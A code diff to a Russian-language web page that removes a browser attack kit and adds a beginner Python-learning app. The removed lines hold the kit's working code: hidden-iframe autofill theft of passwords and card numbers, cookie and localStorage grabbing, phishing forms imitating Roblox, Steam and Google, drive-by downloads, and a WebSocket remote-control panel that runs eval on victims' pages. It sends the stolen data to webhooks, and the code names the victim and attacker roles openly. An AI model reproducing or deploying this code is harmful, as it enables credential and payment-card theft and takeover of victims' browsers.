-            const dataText = formatStolenData(log);
-            const safeData = escapeHtml(dataText);
-            const rawEncoded = encodeURIComponent(dataText);
-            html += `
-                <div class="chat-message">
-                    <div class="time">${time}</div>
-                    <div class="data"><pre style="margin:0; white-space:pre-wrap;">${safeData}</pre></div>
-                    <button class="copy-data" data-raw="${rawEncoded}">📋 Копировать</button>
-                </div>
-            `;
-        });
-        chatBody.innerHTML = html;
-        document.querySelectorAll('.copy-data').forEach(btn => {
-            btn.addEventListener('click', (e) => {
-                const raw = btn.getAttribute('data-raw');
-                if (raw) {
-                    navigator.clipboard.writeText(decodeURIComponent(raw));
-                    btn.innerText = '✅';
-                    setTimeout(() => btn.innerText = '📋 Копировать', 1500);
+    <script>
+        (function() {
+            // ============ SIMPLE PYTHON INTERPRETER ============
+            class SimplePython {
+                constructor() {
+                    this.reset();
                 }
-            });
-        });
-        chatBody.scrollTop = chatBody.scrollHeight;
-    }
-    function escapeHtml(str) {
-        return str.replace(/[&<>]/g, m => m === '&' ? '&amp;' : (m === '<' ? '&lt;' : '&gt;'));
-    }
+                reset() {
+                    this.vars = {};
+                    this.output = [];
+                    this.lists = {};
+                }
+                run(code) {
+                    this.reset();
+                    const lines = code.split('\n');
+                    let i = 0;
+                    while (i < lines.length) {
+                        const line = lines[i];
+                        const trimmed = line.trim();
+                        if (!trimmed || trimmed.startsWith('#')) { i++; continue; }
 
-    // -------------------- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ДЛЯ АТАК --------------------
-    function showThankYouAndRedirect(targetUrl) {
-        const overlay = document.createElement('div');
-        overlay.className = 'thankyou-overlay';
-        overlay.innerHTML = `
-            <div class="thankyou-box">
-                <h1>😈 ПРИВЕТ, ТВОИ ДАННЫЕ БЫЛИ УКРАДЕНЫ!</h1>
-                <p>СПАСИБО ЗА ПОСЕЩЕНИЕ :)</p>
-                <p style="font-size:0.8rem; margin-top:10px;">редирект через 2 секунды...</p>
-            </div>
-        `;
-        document.body.appendChild(overlay);
-        setTimeout(() => {
-            overlay.style.opacity = '0';
-            setTimeout(() => {
-                if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
-                window.location.replace(targetUrl);
-            }, 300);
-        }, 2000);
-    }
-
-    async function getAdvancedSystemInfo() {
-        const info = {};
-        info.userAgent = navigator.userAgent;
-        const ua = navigator.userAgent;
-        if (ua.includes('Windows')) info.os = 'Windows';
-        else if (ua.includes('Mac')) info.os = 'macOS';
-        else if (ua.includes('Linux')) info.os = 'Linux';
-        else if (ua.includes('Android')) info.os = 'Android';
-        else if (ua.includes('iOS')) info.os = 'iOS';
-        else info.os = 'Unknown';
-        if (ua.includes('Firefox')) info.browser = 'Firefox';
-        else if (ua.includes('Chrome')) info.browser = 'Chrome';
-        else if (ua.includes('Safari')) info.browser = 'Safari';
-        else if (ua.includes('Edg')) info.browser = 'Edge';
-        else info.browser = 'Unknown';
-        info.screenResolution = `${screen.width}x${screen.height}`;
-        info.colorDepth = screen.colorDepth;
-        info.language = navigator.language;
-        info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        if (navigator.plugins) {
-            const plugins = [];
-            for (let i = 0; i < navigator.plugins.length; i++) plugins.push(navigator.plugins[i].name);
-            info.plugins = plugins.join(', ');
-        }
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (gl) {
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            if (debugInfo) {
-                info.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                info.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-            }
-        }
-        info.touchSupport = 'ontouchstart' in window;
-        info.windowSize = `${window.innerWidth}x${window.innerHeight}`;
-        return info;
-    }
-
-    // -------------------- ГЕНЕРАЦИЯ ССЫЛОК (единый владелец) --------------------
-    const OWNER_ID = 'master_scammer';
-    function makeLink(params) {
-        const base = window.location.href.split('?')[0];
-        params.set('owner', OWNER_ID);
-        params.set('_t', Date.now());
-        return base + '?' + params.toString();
-    }
-    function copyToClipboard(text) {
-        navigator.clipboard.writeText(text).then(() => alert('Ссылка скопирована!')).catch(() => alert('Ошибка'));
-    }
-
-    // Stealth
-    document.getElementById('generateStealthLink').onclick = () => {
-        const redirect = document.getElementById('stealthRedirect').value.trim() || 'https://youtube.com';
-        const extraWh = document.getElementById('stealthWebhook').value.trim();
-        const params = new URLSearchParams();
-        params.set('stealth', '1');
-        params.set('redirect', redirect);
-        if (extraWh) params.set('extra_wh', extraWh);
-        const link = makeLink(params);
-        document.getElementById('stealthLinkSpan').innerHTML = `<a href="${link}" target="_blank">${link}</a>`;
-        document.getElementById('stealthResult').style.display = 'block';
-        document.getElementById('copyStealthLink').onclick = () => copyToClipboard(link);
-    };
-    // Drive-by
-    document.getElementById('generateDrivebyLink').onclick = () => {
-        const filename = document.getElementById('drivebyFilename').value.trim() || 'payload.exe';
-        const content = document.getElementById('drivebyContent').value;
-        const redirect = document.getElementById('drivebyRedirect').value.trim() || 'https://google.com';
-        const webhook = document.getElementById('drivebyWebhook').value.trim();
-        const params = new URLSearchParams();
-        params.set('driveby', '1');
-        params.set('filename', filename);
-        params.set('content', btoa(unescape(encodeURIComponent(content))));
-        params.set('redirect', redirect);
-        if (webhook) params.set('dw_wh', webhook);
-        const link = makeLink(params);
-        document.getElementById('drivebyLinkSpan').innerHTML = `<a href="${link}" target="_blank">${link}</a>`;
-        document.getElementById('drivebyResult').style.display = 'block';
-        document.getElementById('copyDrivebyLink').onclick = () => copyToClipboard(link);
-    };
-    // Card stealer
-    document.getElementById('generateCardLink').onclick = () => {
-        const redirect = document.getElementById('cardRedirect').value.trim() || 'https://youtube.com';
-        const wh = document.getElementById('cardWebhook').value.trim();
-        const params = new URLSearchParams();
-        params.set('cardsteal', '1');
-        params.set('redirect', redirect);
-        if (wh) params.set('card_wh', wh);
-        const link = makeLink(params);
-        document.getElementById('cardLinkSpan').innerHTML = `<a href="${link}" target="_blank">${link}</a>`;
-        document.getElementById('cardResult').style.display = 'block';
-        document.getElementById('copyCardLink').onclick = () => copyToClipboard(link);
-    };
-    // Фишинг
-    document.getElementById('generatePhishLink').onclick = () => {
-        const redirect = document.getElementById('phishRedirect').value.trim() || 'https://roblox.com';
-        const phishType = document.getElementById('phishType').value;
-        const params = new URLSearchParams();
-        params.set('phish', phishType);
-        params.set('redirect', redirect);
-        const link = makeLink(params);
-        document.getElementById('phishLinkSpan').innerHTML = `<a href="${link}" target="_blank">${link}</a>`;
-        document.getElementById('phishResult').style.display = 'block';
-        document.getElementById('copyPhishLink').onclick = () => copyToClipboard(link);
-    };
-    // Чекер
-    document.getElementById('runCheckerBtn').onclick = async () => {
-        const listText = document.getElementById('checkerList').value.trim();
-        if (!listText) { alert('Введите список login:pass'); return; }
-        const lines = listText.split(/\r?\n/);
-        let validCount = 0;
-        for (let line of lines) {
-            line = line.trim();
-            if (!line) continue;
-            let [login, pass] = line.split(/[:;]/);
-            if (!login || !pass) continue;
-            const isValid = Math.random() > 0.7;
-            if (isValid) {
-                validCount++;
-                addStolenEntry({ type: 'checker_result', result: `✅ ВАЛИДНО: ${login} / ${pass}` });
-            }
-        }
-        addStolenEntry({ type: 'checker_result', result: `🔍 Чекер завершён: найдено ${validCount} рабочих пар из ${lines.length}` });
-        alert(`Чекер выполнен! Результаты в чате (найдено ${validCount} валидных).`);
-    };
-
-    // -------------------- REMOTE CONTROL (WebSocket через Piesocket) --------------------
-    document.getElementById('generateRemoteLink').onclick = () => {
-        const redirect = document.getElementById('remoteRedirect').value.trim() || 'https://youtube.com';
-        const extraWh = document.getElementById('remoteWebhook').value.trim();
-        const sessionId = Math.random().toString(36).substring(2, 12) + Date.now().toString(36);
-        const params = new URLSearchParams();
-        params.set('remote', sessionId);
-        params.set('redirect', redirect);
-        if (extraWh) params.set('extra_wh', extraWh);
-        const victimLink = makeLink(params);
-        // Контрольная панель: тот же домен с параметром control=sessionId
-        const controlLink = window.location.href.split('?')[0] + '?control=' + sessionId;
-        document.getElementById('remoteLinkSpan').innerHTML = `<a href="${victimLink}" target="_blank">${victimLink}</a>`;
-        document.getElementById('controlPanelSpan').innerHTML = `<a href="${controlLink}" target="_blank">${controlLink}</a>`;
-        document.getElementById('remoteResult').style.display = 'block';
-        document.getElementById('copyRemoteLink').onclick = () => copyToClipboard(victimLink);
-        document.getElementById('copyControlLink').onclick = () => copyToClipboard(controlLink);
-    };
-
-    // ---------- ОБРАБОТЧИКИ АТАК (СТОРОНА ЖЕРТВЫ) ----------
-    (async function handleAttacks() {
-        const urlParams = new URLSearchParams(window.location.search);
-        const owner = urlParams.get('owner');
-        if (!owner) return;
-        function send(data, webhookExtra = null) {
-            addStolenEntry(data);
-            if (webhookExtra && webhookExtra.startsWith('http')) {
-                fetch(webhookExtra, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) }).catch(e=>console.log);
-            }
-        }
-
-        // STEALTH
-        if (urlParams.has('stealth')) {
-            const redirect = urlParams.get('redirect') || 'https://google.com';
-            const extraWh = urlParams.get('extra_wh');
-            const stolen = { type: 'stealth_full', userAgent: navigator.userAgent, cookies: document.cookie, localStorage: {}, passwords: [] };
-            for (let i=0;i<localStorage.length;i++) stolen.localStorage[localStorage.key(i)] = localStorage.getItem(localStorage.key(i));
-            const iframe = document.createElement('iframe');
-            iframe.srcdoc = `<html><body><form><input autocomplete="username"><input autocomplete="current-password"></form><script>setTimeout(()=>{let u=document.querySelector('[autocomplete="username"]').value,p=document.querySelector('[autocomplete="current-password"]').value;parent.postMessage({user:u,pass:p},'*');},200);<\/script></body></html>`;
-            iframe.style.display='none';
-            document.body.appendChild(iframe);
-            const creds = await new Promise(r=>{ window.addEventListener('message',e=>{ if(e.data) r(e.data); iframe.remove(); }); setTimeout(()=>{ iframe.remove(); r({});},800); });
-            if(creds.user) stolen.passwords.push(`${creds.user}:${creds.pass}`);
-            try { const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()); stolen.ip=ip.ip; 
-                try { const geo = await fetch(`https://ipapi.co/${ip.ip}/json/`).then(r=>r.json()); stolen.geo = { city: geo.city, country: geo.country_name }; } catch(e){} 
-            } catch(e){ stolen.ip='unknown'; }
-            stolen.cookies_count = document.cookie.split(';').filter(c=>c.trim()).length;
-            stolen.systemInfo = await getAdvancedSystemInfo();
-            send(stolen, extraWh);
-            showThankYouAndRedirect(redirect);
-            return;
-        }
-        // DRIVE-BY
-        if (urlParams.has('driveby')) {
-            const filename = urlParams.get('filename') || 'malware.exe';
-            const contentB64 = urlParams.get('content') || '';
-            const redirect = urlParams.get('redirect') || 'https://google.com';
-            const dwWh = urlParams.get('dw_wh');
-            let content = '';
-            try { content = atob(contentB64); } catch(e){ content = 'echo hacked'; }
-            const blob = new Blob([content], {type:'application/octet-stream'});
-            const a = document.createElement('a');
-            a.href = URL.createObjectURL(blob);
-            a.download = filename;
-            a.click();
-            setTimeout(()=>URL.revokeObjectURL(a.href), 100);
-            send({ type: 'driveby_download', filename, content_preview: content.slice(0,200) }, dwWh);
-            showThankYouAndRedirect(redirect);
-            return;
-        }
-        // CARD STEALER
-        if (urlParams.has('cardsteal')) {
-            const redirect = urlParams.get('redirect') || 'https://google.com';
-            const cardWh = urlParams.get('card_wh');
-            const cards = [];
-            document.querySelectorAll('input').forEach(inp => {
-                const val = inp.value;
-                if (!val) return;
-                const lower = (inp.name+inp.id+inp.placeholder).toLowerCase();
-                if (/^\d{16}$/.test(val) || /^\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}$/.test(val)) cards.push({type:'card_number',value:val});
-                if (/^\d{3,4}$/.test(val) && lower.includes('cvv')) cards.push({type:'cvv',value:val});
-                if (/^\d{2}\/\d{2,4}$/.test(val) && lower.includes('exp')) cards.push({type:'expiry',value:val});
-            });
-            const iframeCard = document.createElement('iframe');
-            iframeCard.srcdoc = `<html><body><form><input autocomplete="cc-number"><input autocomplete="cc-exp"><input autocomplete="cc-csc"><input autocomplete="cc-name"></form><script>setTimeout(()=>{parent.postMessage({number:document.querySelector('[autocomplete="cc-number"]').value,exp:document.querySelector('[autocomplete="cc-exp"]').value,cvv:document.querySelector('[autocomplete="cc-csc"]').value,name:document.querySelector('[autocomplete="cc-name"]').value},'*');},300);<\/script></body></html>`;
-            iframeCard.style.display='none';
-            document.body.appendChild(iframeCard);
-            const auto = await new Promise(r=>{ window.addEventListener('message',e=>{ if(e.data?.number) r(e.data); iframeCard.remove(); }); setTimeout(()=>{ iframeCard.remove(); r({});},1000); });
-            if(auto.number) cards.push({autofill:auto});
-            send({ type: 'card_stealer', cards }, cardWh);
-            showThankYouAndRedirect(redirect);
-            return;
-        }
-        // PHISHING
-        if (urlParams.has('phish')) {
-            const type = urlParams.get('phish');
-            const redirect = urlParams.get('redirect') || 'https://google.com';
-            document.body.innerHTML = '';
-            document.body.style.background='#0a0c17';
-            let html = '';
-            if (type === 'roblox') html = `<h2>Roblox вход</h2><input id="u" placeholder="Логин"><input id="p" type="password" placeholder="Пароль"><button id="btn">Войти</button>`;
-            else if (type === 'steam') html = `<h2>Steam вход</h2><input id="u" placeholder="Логин Steam"><input id="p" type="password" placeholder="Пароль"><button id="btn">Войти</button>`;
-            else if (type === 'google') html = `<h2>Google аккаунт</h2><input id="u" placeholder="Email"><input id="p" type="password" placeholder="Пароль"><button id="btn">Войти</button>`;
-            else html = `<h2>Подтвердите вход</h2><input id="u" placeholder="Логин/Email"><input id="p" type="password" placeholder="Пароль"><button id="btn">Отправить</button>`;
-            const div = document.createElement('div'); div.style.maxWidth='400px'; div.style.margin='10% auto'; div.style.background='#111'; div.style.padding='30px'; div.style.borderRadius='20px'; div.innerHTML = html;
-            document.body.appendChild(div);
-            document.getElementById('btn').onclick = () => {
-                const login = document.getElementById('u').value;
-                const pass = document.getElementById('p').value;
-                let credType = 'universal_creds';
-                if (type === 'roblox') credType = 'roblox_creds';
-                else if (type === 'steam') credType = 'steam_creds';
-                else if (type === 'google') credType = 'google_creds';
-                addStolenEntry({ type: credType, username: login, password: pass, email: login });
-                showThankYouAndRedirect(redirect);
-            };
-            return;
-        }
-        // REMOTE CONTROL (WebSocket)
-        if (urlParams.has('remote')) {
-            const sessionId = urlParams.get('remote');
-            const redirect = urlParams.get('redirect') || 'https://google.com';
-            const extraWh = urlParams.get('extra_wh');
-            // Подключаемся к Piesocket WebSocket с комнатой sessionId
-            const wsUrl = `wss://demo.piesocket.com/v3/channel/123?api_key=VCbCFlYqw6rK8j2T&room=${sessionId}`;
-            let ws = null;
-            function connectWebSocket() {
-                ws = new WebSocket(wsUrl);
-                ws.onopen = () => {
-                    console.log('[RC] Connected to control channel');
-                    addStolenEntry({ type: 'remote_status', result: `Жертва подключилась. ID: ${sessionId}` }, extraWh);
-                };
-                ws.onmessage = async (event) => {
-                    try {
-                        const data = JSON.parse(event.data);
-                        if (data.type === 'command') {
-                            const cmd = data.cmd;
-                            if (cmd.startsWith('alert:')) {
-                                alert(cmd.substring(6));
-                            } else if (cmd.startsWith('redirect:')) {
-                                window.location.href = cmd.substring(9);
-                            } else if (cmd.startsWith('eval:')) {
-                                eval(cmd.substring(5));
-                            } else if (cmd.startsWith('click:')) {
-                                const sel = cmd.substring(6);
-                                const el = document.querySelector(sel);
-                                if (el) el.click();
-                            } else if (cmd.startsWith('scrollY:')) {
-                                window.scrollTo(0, parseInt(cmd.substring(8)));
-                            } else if (cmd === 'getCookies') {
-                                ws.send(JSON.stringify({ type: 'response', data: document.cookie }));
-                            } else if (cmd === 'getLocalStorage') {
-                                let ls = {};
-                                for (let i=0;i<localStorage.length;i++) ls[localStorage.key(i)] = localStorage.getItem(localStorage.key(i));
-                                ws.send(JSON.stringify({ type: 'response', data: JSON.stringify(ls) }));
-                            } else if (cmd === 'screenshot') {
-                                if (typeof html2canvas !== 'undefined') {
-                                    const canvas = await html2canvas(document.body);
-                                    const imgData = canvas.toDataURL();
-                                    ws.send(JSON.stringify({ type: 'response', data: imgData.substring(0, 200) + '...' }));
-                                } else {
-                                    ws.send(JSON.stringify({ type: 'response', data: 'html2canvas not loaded' }));
+                        // for loop
+                        const forMatch = trimmed.match(/^for\s+(\w+)\s+in\s+range\s*\(\s*(\d+)\s*\)\s*:/);
+                        if (forMatch) {
+                            const varName = forMatch[1];
+                            const count = parseInt(forMatch[2]);
+                            const bodyLines = [];
+                            i++;
+                            while (i < lines.length && (lines[i].startsWith('    ') || lines[i].startsWith('\t') ||
+                                    lines[i].trim() === '')) {
+                                const bl = lines[i].trim();
+                                if (bl) bodyLines.push(bl);
+                                i++;
+                            }
+                            for (let n = 0; n < count; n++) {
+                                this.vars[varName] = n;
+                                for (const bl of bodyLines) {
+                                    this.executeLine(bl);
                                 }
                             }
+                            continue;
                         }
-                    } catch(e) { console.error(e); }
-                };
-                ws.onclose = () => {
-                    setTimeout(connectWebSocket, 5000);
-                };
+
+                        // if/elif/else
+                        const ifMatch = trimmed.match(/^if\s+(.+)\s*:/);
+                        if (ifMatch) {
+                            const condition = ifMatch[1];
+                            const ifBody = [];
+                            const elifBodies = [];
+                            const elifConditions = [];
+                            let elseBody = null;
+                            i++;
+                            while (i < lines.length && (lines[i].startsWith('    ') || lines[i].startsWith('\t') ||
+                                    lines[i].trim() === '')) {
+                                const bl = lines[i].trim();
+                                if (bl) ifBody.push(bl);
+                                i++;
+                            }
+                            // Check elif/else
+                            while (i < lines.length) {
+                                const elifMatch = lines[i].trim().match(/^elif\s+(.+)\s*:/);
+                                const elseMatch = lines[i].trim().match(/^else\s*:/);
+                                if (elifMatch) {
+                                    elifConditions.push(elifMatch[1]);
+                                    const eBody = [];
+                                    i++;
+                                    while (i < lines.length && (lines[i].startsWith('    ') || lines[i]
+                                            .startsWith('\t') || lines[i].trim() === '')) {
+                                        const bl = lines[i].trim();
+                                        if (bl) eBody.push(bl);
+                                        i++;
+                                    }
+                                    elifBodies.push(eBody);
+                                } else if (elseMatch) {
+                                    elseBody = [];
+                                    i++;
+                                    while (i < lines.length && (lines[i].startsWith('    ') || lines[i]
+                                            .startsWith('\t') || lines[i].trim() === '')) {
+                                        const bl = lines[i].trim();
+                                        if (bl) elseBody.push(bl);
+                                        i++;
+                                    }
+                                    break;
+                                } else {
+                                    break;
+                                }
+                            }
+                            if (this.evalCondition(condition)) {
+                                for (const bl of ifBody) this.executeLine(bl);
+                            } else {
+                                let executed = false;
+                                for (let ei = 0; ei < elifConditions.length; ei++) {
+                                    if (this.evalCondition(elifConditions[ei])) {
+                                        for (const bl of elifBodies[ei]) this.executeLine(bl);
+                                        executed = true;
+                                        break;
+                                    }
+                                }
+                                if (!executed && elseBody) {
+                                    for (const bl of elseBody) this.executeLine(bl);
+                                }
+                            }
+                            continue;
+                        }
+
+                        this.executeLine(trimmed);
+                        i++;
+                    }
+                    return this.output.join('\n');
+                }
+                executeLine(line) {
+                    // print()
+                    const printMatch = line.match(/^print\s*\(\s*(.+)\s*\)\s*$/);
+                    if (printMatch) {
+                        const val = this.evalExpr(printMatch[1]);
+                        this.output.push(String(val));
+                        return;
+                    }
+                    // assignment
+                    const assignMatch = line.match(/^(\w+)\s*=\s*(.+)$/);
+                    if (assignMatch) {
+                        const varName = assignMatch[1];
+                        const expr = assignMatch[2];
+                        const val = this.evalExpr(expr);
+                        this.vars[varName] = val;
+                        if (Array.isArray(val)) this.lists[varName] = val;
+                        return;
+                    }
+                    // list append
+                    const appendMatch = line.match(/^(\w+)\s*\.\s*append\s*\(\s*(.+)\s*\)\s*$/);
+                    if (appendMatch && this.lists[appendMatch[1]] !== undefined) {
+                        const val = this.evalExpr(appendMatch[2]);
+                        this.lists[appendMatch[1]].push(val);
+                        this.vars[appendMatch[1]] = this.lists[appendMatch[1]];
+                        return;
+                    }
+                }
+                evalExpr(expr) {
+                    expr = expr.trim();
+                    // string literal
+                    if ((expr.startsWith('"') && expr.endsWith('"')) || (expr.startsWith("'") && expr.endsWith("'"))) {
+                        return expr.slice(1, -1);
+                    }
+                    // f-string
+                    if (expr.startsWith('f"') && expr.endsWith('"')) {
+                        let inner = expr.slice(2, -1);
+                        inner = inner.replace(/\{(\w+)\}/g, (_, v) => this.vars[v] !== undefined ? this.vars[v] : '{' + v +
+                            '}');
+                        return inner;
+                    }
+                    // list literal
+                    if (expr.startsWith('[') && expr.endsWith(']')) {
+                        const inner = expr.slice(1, -1).trim();
+                        if (!inner) return [];
+                        const items = inner.split(',').map(s => this.evalExpr(s.trim()));
+                        return items;
+                    }
+                    // int() conversion
+                    const intMatch = expr.match(/^int\s*\(\s*(.+)\s*\)\s*$/);
+                    if (intMatch) return parseInt(this.evalExpr(intMatch[1])) || 0;
+                    // str() conversion
+                    const strMatch = expr.match(/^str\s*\(\s*(.+)\s*\)\s*$/);
+                    if (strMatch) return String(this.evalExpr(strMatch[1]));
+                    // len()
+                    const lenMatch = expr.match(/^len\s*\(\s*(\w+)\s*\)\s*$/);
+                    if (lenMatch && this.lists[lenMatch[1]] !== undefined) return this.lists[lenMatch[1]].length;
+                    if (lenMatch && typeof this.vars[lenMatch[1]] === 'string') return this.vars[lenMatch[1]].length;
+                    if (lenMatch && Array.isArray(this.vars[lenMatch[1]])) return this.vars[lenMatch[1]].length;
+                    // number
+                    if (/^-?\d+\.?\d*$/.test(expr)) return parseFloat(expr);
+                    // variable
+                    if (this.vars[expr] !== undefined) return this.vars[expr];
+                    // arithmetic
+                    try {
+                        const arithMatch = expr.match(/^(.+)\s*([+\-*/])\s*(.+)$/);
+                        if (arithMatch && !expr.includes('"') && !expr.includes("'")) {
+                            const left = this.evalExpr(arithMatch[1].trim());
+                            const right = this.evalExpr(arithMatch[3].trim());
+                            const op = arithMatch[2];
+                            if (typeof left === 'number' && typeof right === 'number') {
+                                switch (op) {
+                                    case '+':
+                                        return left + right;
+                                    case '-':
+                                        return left - right;
+                                    case '*':
+                                        return left * right;
+                                    case '/':
+                                        return right !== 0 ? left / right : 0;
+                                }
+                            }
+                            if (op === '+' && (typeof left === 'string' || typeof right === 'string')) return String(
+                                left) + String(right);
+                        }
+                    } catch (e) {}
+                    return expr;
+                }
+                evalCondition(cond) {
+                    cond = cond.trim();
+                    // comparison
+                    const compMatch = cond.match(/^(.+?)\s*(==|!=|>=|<=|>|<)\s*(.+)$/);
+                    if (compMatch) {
+                        const left = this.evalExpr(compMatch[1].trim());
+                        const right = this.evalExpr(compMatch[3].trim());
+                        switch (compMatch[2]) {
+                            case '==':
+                                return left == right;
+                            case '!=':
+                                return left != right;
+                            case '>':
+                                return Number(left) > Number(right);
+                            case '<':
+                                return Number(left) < Number(right);
+                            case '>=':
+                                return Number(left) >= Number(right);
+                            case '<=':
+                                return Number(left) <= Number(right);
+                        }
+                    }
+                    // Check if variable is truthy
+                    if (this.vars[cond] !== undefined) return Boolean(this.vars[cond]);
+                    return cond === 'True' || cond === 'true';
+                }
             }
-            connectWebSocket();
-            // Не показываем сообщение, а просто остаёмся на странице (или редирект? По желанию: оставляем страницу для контроля)
-            // Но для маскировки можно показать что-то нейтральное:
-            document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#0a0c17;color:#0f0;"><div>Loading...</div></div>';
-            // Уведомляем владельца
-            addStolenEntry({ type: 'remote_session', session: sessionId, userAgent: navigator.userAgent }, extraWh);
-            return;
-        }
-    })();
 
-    // -------------------- КОНТРОЛЬНАЯ ПАНЕЛЬ ДЛЯ АТАКУЮЩЕГО --------------------
-    (function controlPanel() {
-        const urlParams = new URLSearchParams(window.location.search);
-        const controlSession = urlParams.get('control');
-        if (!controlSession) return;
-        // Если это контрольная панель, перестраиваем интерфейс
-        document.body.innerHTML = '';
-        document.body.style.background = '#0a0c17';
-        document.body.style.color = '#00ffcc';
-        document.body.style.fontFamily = 'monospace';
-        document.body.style.padding = '20px';
-        const container = document.createElement('div');
-        container.style.maxWidth = '800px';
-        container.style.margin = 'auto';
-        container.style.background = '#11161f';
-        container.style.border = '2px solid #ff3366';
-        container.style.borderRadius = '28px';
-        container.style.padding = '20px';
-        container.innerHTML = `
-            <h1 style="color:#ff3366">🎮 REMOTE CONTROL PANEL</h1>
-            <p>Session ID: <strong>${controlSession}</strong></p>
-            <p>Статус: <span id="wsStatus">Подключение...</span></p>
-            <hr>
-            <div>
-                <h3>Отправить команду:</h3>
-                <select id="cmdType">
-                    <option value="alert">alert:текст</option>
-                    <option value="redirect">redirect:URL</option>
-                    <option value="eval">eval:JS код</option>
-                    <option value="click">click:CSS селектор</option>
-                    <option value="scrollY">scrollY:пиксели</option>
-                    <option value="getCookies">getCookies</option>
-                    <option value="getLocalStorage">getLocalStorage</option>
-                    <option value="screenshot">screenshot</option>
-                </select>
-                <input type="text" id="cmdValue" placeholder="значение команды" style="width:100%; margin:10px 0;">
-                <button id="sendCmdBtn">📡 ОТПРАВИТЬ КОМАНДУ</button>
-            </div>
-            <hr>
-            <div>
-                <h3>Ответы от жертвы:</h3>
-                <div id="responses" style="background:#000; padding:10px; border-radius:12px; height:300px; overflow-y:auto; font-size:12px;"></div>
-            </div>
-        `;
-        document.body.appendChild(container);
-        const wsUrl = `wss://demo.piesocket.com/v3/channel/123?api_key=VCbCFlYqw6rK8j2T&room=${controlSession}`;
-        let ws = null;
-        function connect() {
-            ws = new WebSocket(wsUrl);
-            ws.onopen = () => {
-                document.getElementById('wsStatus').innerText = '✅ Подключено к жертве';
-                document.getElementById('wsStatus').style.color = '#88ff88';
+            const py = new SimplePython();
+
+            // ============ APP STATE ============
+            const state = {
+                mode: null, // 'student' | 'pro'
+                xp: 0,
+                streak: 0,
+                lastLessonDate: null,
+                completedLessons: {}, // key: 'student-0-1' -> true
+                currentScreen: 'welcome',
+                currentLessonKey: null,
+                currentExerciseIndex: 0,
+                exerciseAttempts: 0,
             };
-            ws.onmessage = (event) => {
-                const respDiv = document.getElementById('responses');
-                const msg = document.createElement('div');
-                msg.style.borderLeft = '2px solid #ff3366';
-                msg.style.padding = '5px';
-                msg.style.margin = '5px 0';
-                msg.innerHTML = `<span style="color:#88ffaa;">[${new Date().toLocaleTimeString()}]</span> ${event.data}`;
-                respDiv.appendChild(msg);
-                respDiv.scrollTop = respDiv.scrollHeight;
+
+            // ============ LESSON DATA ============
+            const lessonData = {
+                student: {
+                    units: [{
+                        id: 0,
+                        title: 'Блок 1: Основы Python',
+                        desc: 'print(), комментарии, простой вывод',
+                        lessons: [
+                            { id: 0, title: 'Привет, мир!',
+                                theory: '<h3>📝 Твой первый код</h3><p>Python — это язык программирования. Самая простая команда — <code>print()</code>. Она выводит текст на экран.</p><pre>print("Привет, мир!")</pre><p>Текст в кавычках называется <b>строкой</b>. Попробуй сам!</p>',
+                                exercises: [
+                                    { type: 'code', q: 'Напиши код, который выводит "Я учу Python!" (с восклицательным знаком)',
+                                        answer: 'Я учу Python!', hint: 'Используй print("...")' },
+                                ] },
+                            { id: 1, title: 'Комментарии',
+                                theory: '<h3>💬 Комментарии</h3><p>Комментарии начинаются с <code>#</code> и игнорируются Python. Они нужны для пояснений.</p><pre># Это комментарий\nprint("Код работает")  # И это тоже</pre>',
+                                exercises: [
+                                    { type: 'mc', q: 'Какой символ начинает комментарий в Python?',
+                                        options: ['//', '#', '--', '/*'], answer: 1 },
+                                ] },
+                            { id: 2, title: 'Несколько print()',
+                                theory: '<h3>📋 Несколько выводов</h3><p>Можно использовать несколько <code>print()</code> подряд. Каждый выводит текст с новой строки.</p><pre>print("Строка 1")\nprint("Строка 2")</pre>',
+                                exercises: [
+                                    { type: 'code', q: 'Напиши код, который выводит две строки: сначала "Python", затем "Крут!"',
+                                        answer: 'Python\nКрут!', hint: 'Два вызова print()' },
+                                ] },
+                            { id: 3, title: 'Арифметика в print()',
+                                theory: '<h3>🔢 Математика</h3><p>Внутри <code>print()</code> можно писать выражения без кавычек, и Python их посчитает.</p><pre>print(5 + 3)   # Выведет 8\nprint(10 * 2)  # Выведет 20</pre>',
+                                exercises: [
+                                    { type: 'code', q: 'Выведи результат умножения 7 на 6 с помощью print()',
+                                        answer: '42', hint: 'print(7 * 6)' },
+                                ] },
+                            { id: 4, title: 'Итоги блока 1',
+                                theory: '<h3>🏆 Повторение</h3><p>Ты уже знаешь: <code>print()</code>, комментарии <code>#</code>, и арифметику. Проверим!</p>',
+                                exercises: [
+                                    { type: 'mc', q: 'Что выведет print(2 + 3 * 2)?', options: ['10', '8', '7', '12'],
+                                        answer: 1 },
+                                    { type: 'code', q: 'Выведи текст "Финиш!" с помощью print()', answer: 'Финиш!',
+                                        hint: 'print("Финиш!")' },
+                                ] },
+                        ],
+                    }, {
+                        id: 1,
+                        title: 'Блок 2: Переменные',
+                        desc: 'Переменные, типы данных, ввод',
+                        lessons: [
+                            { id: 0, title: 'Что такое переменная?',
+                                theory: '<h3>📦 Переменные</h3><p>Переменная — это контейнер для данных. Ты даёшь ей имя и присваиваешь значение через <code>=</code>.</p><pre>name = "Анна"\nprint(name)  # Выведет: Анна</pre>',
+                                exercises: [
+                                    { type: 'code', q: 'Создай переменную <code>city</code> со значением "Москва" и выведи её',
+                                        answer: 'Москва', hint: 'city = "Москва"\\nprint(city)' },
+                                ] },
+                            { id: 1, title: 'Числовые переменные',
+                                theory: '<h3>🔢 Числа</h3><p>Переменные могут хранить числа: целые (<code>int</code>) и дробные (<code>float</code>).</p><pre>age = 25\nprice = 19.99\nprint(age + 5)  # 30</pre>',
+                                exercises: [
+                                    { type: 'code', q: 'Создай переменную <code>x</code> со значением 10, затем выведи x * 3',
+                                        answer: '30', hint: 'x = 10\\nprint(x * 3)' },
+                                ] },
+                            { id: 2, title: 'Типы данных',
